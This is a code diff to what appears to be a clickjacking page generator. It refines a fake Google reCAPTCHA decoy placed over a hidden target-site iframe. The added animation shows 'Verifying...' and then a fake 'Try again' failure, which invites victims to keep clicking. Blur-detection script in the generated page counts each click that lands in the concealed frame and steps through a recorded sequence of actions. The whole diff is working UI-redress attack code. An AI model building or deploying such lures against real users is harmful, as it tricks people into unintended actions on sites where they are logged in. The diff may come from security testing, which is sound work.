@@ -33,6 +33,26 @@
             border-radius: 2px;
             background-color: #fff;
             margin-right: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .recaptcha-checkbox.checked {
+            background-color: #4285f4;
+            border-color: #4285f4;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");
+            background-size: 16px;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .recaptcha-checkbox.loading {
+            border-color: #4285f4;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .recaptcha-text {
@@ -40,6 +60,15 @@
             color: #000;
             font-weight: 500;
             flex-grow: 1;
+            transition: color 0.3s ease;
+        }
+
+        .recaptcha-text.loading {
+            color: #4285f4;
+        }
+
+        .recaptcha-text.error {
+            color: #d32f2f;
         }
 
         .recaptcha-logo {
@@ -245,6 +274,38 @@
             document.getElementById('stepDisplay').innerText = "Steps Recorded: 0";
         }
 
+        // Add click handler for reCAPTCHA animation
+        const recaptchaBox = document.getElementById('decoy_recaptcha');
+        let recaptchaLoading = false;
+
+        recaptchaBox.addEventListener('click', (e) => {
+            if (recaptchaLoading) return;
+
+            const checkbox = recaptchaBox.querySelector('.recaptcha-checkbox');
+            const text = recaptchaBox.querySelector('.recaptcha-text');
+
+            recaptchaLoading = true;
+            checkbox.classList.remove('checked');
+            checkbox.classList.add('loading');
+            text.classList.add('loading');
+            text.innerText = 'Verifying...';
+
+            // Simulate verification failure after 2 seconds
+            setTimeout(() => {
+                checkbox.classList.remove('loading');
+                text.classList.remove('loading');
+                text.classList.add('error');
+                text.innerText = 'Try again';
+
+                // Reset after 1.5 seconds
+                setTimeout(() => {
+                    text.classList.remove('error');
+                    text.innerText = "I'm not a robot";
+                    recaptchaLoading = false;
+                }, 1500);
+            }, 2000);
+        });
+
         // Toggle Decoy Type
         decoyType.addEventListener('change', (e) => {
             if(e.target.value === 'recaptcha'){
@@ -350,14 +411,19 @@
             if(decoyType.value === 'recaptcha') {
                 style = `
                 .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 12px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); font-family: 'Roboto', sans-serif; cursor: pointer; user-select: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1; }
-                .recaptcha-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background-color: #fff; margin-right: 12px; }
-                .recaptcha-text { font-size: 14px; color: #000; font-weight: 500; flex-grow: 1; }
+                .recaptcha-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background-color: #fff; margin-right: 12px; transition: all 0.3s ease; }
+                .recaptcha-checkbox.checked { background-color: #4285f4; border-color: #4285f4; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E"); background-size: 16px; background-repeat: no-repeat; background-position: center; }
+                .recaptcha-checkbox.loading { border-color: #4285f4; animation: spin 1s linear infinite; }
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                .recaptcha-text { font-size: 14px; color: #000; font-weight: 500; flex-grow: 1; transition: color 0.3s ease; }
+                .recaptcha-text.loading { color: #4285f4; }
+                .recaptcha-text.error { color: #d32f2f; }
                 .recaptcha-logo-img { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: 32px; background-repeat: no-repeat; margin: 0 auto; }
                 .recaptcha-logo-text { font-size: 10px; color: #555; text-align: center; margin-top: 2px; }
                 .recaptcha-privacy { font-size: 8px; color: #555; text-align: center; }`;
                 
                 html = `
-                <div class="recaptcha-box">
+                <div class="recaptcha-box" id="recaptcha_decoy">
                     <div class="recaptcha-checkbox"></div>
                     <div class="recaptcha-text">I'm not a robot</div>
                     <div>
@@ -410,14 +476,48 @@
                 <iframe id="target_frame" src="${frame.src}"></iframe>
 
                 <script>
-                    // THE MULTI-CLICK ENGINE
+                    // Multi-click logic
                     const steps = ${stepsJSON};
                     let currentStep = 0;
                     const iframe = document.getElementById('target_frame');
                     const counter = document.getElementById('click_counter');
 
+                    // reCAPTCHA animation logic (only for reCAPTCHA decoy)
+                    ${decoyType.value === 'recaptcha' ? `
+                    const recaptchaBox = document.getElementById('recaptcha_decoy');
+                    let recaptchaLoading = false;
+                    
+                    function animateRecaptcha() {
+                        if (recaptchaLoading) return;
+                        
+                        const checkbox = recaptchaBox.querySelector('.recaptcha-checkbox');
+                        const text = recaptchaBox.querySelector('.recaptcha-text');
+                        
+                        recaptchaLoading = true;
+                        checkbox.classList.remove('checked');
+                        checkbox.classList.add('loading');
+                        text.classList.add('loading');
+                        text.innerText = 'Verifying...';
+                        
+                        setTimeout(() => {
+                            checkbox.classList.remove('loading');
+                            text.classList.remove('loading');
+                            text.classList.add('error');
+                            text.innerText = 'Try again';
+                            
+                            setTimeout(() => {
+                                text.classList.remove('error');
+                                text.innerText = "I'm not a robot";
+                                recaptchaLoading = false;
+                            }, 1500);
+                        }, 2000);
+                    }` : ''}
+
                     // We listen for the window losing focus (which happens when they click the iframe)
                     window.addEventListener('blur', function() {
+                        // Trigger reCAPTCHA animation on click
+                        ${decoyType.value === 'recaptcha' ? 'animateRecaptcha();' : ''}
+                        
                         // Wait a split second to allow the click to register in the iframe
                         setTimeout(() => {
                             currentStep++;
